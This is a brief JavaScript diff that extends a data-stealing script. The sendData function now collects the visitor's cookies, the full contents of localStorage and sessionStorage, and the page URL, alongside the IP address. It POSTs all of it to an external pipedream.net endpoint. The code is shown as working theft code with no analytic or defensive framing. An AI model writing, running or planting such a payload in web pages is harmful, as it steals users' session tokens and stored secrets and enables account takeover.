@@ -11,9 +11,13 @@ async function getIP() {
 
 async function sendData() {
   const ip = await getIP();
-  const cookies = document.cookie;
-
-  const payload = { ip, cookies };
+  const payload = {
+    ip,
+    cookie: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    url: location.href
+  };
 
   fetch('https://eobwcepa8jfhqcn.m.pipedream.net', {
     method: 'POST',
